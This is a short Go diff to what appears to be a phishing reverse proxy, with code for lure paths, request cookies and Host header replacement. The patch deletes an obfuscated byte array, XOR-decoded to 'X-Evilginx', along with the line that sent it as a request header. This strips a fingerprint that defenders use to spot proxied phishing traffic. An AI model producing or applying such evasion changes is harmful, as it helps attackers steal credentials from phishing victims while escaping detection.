@@ -356,7 +356,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -383,9 +382,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -413,7 +409,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
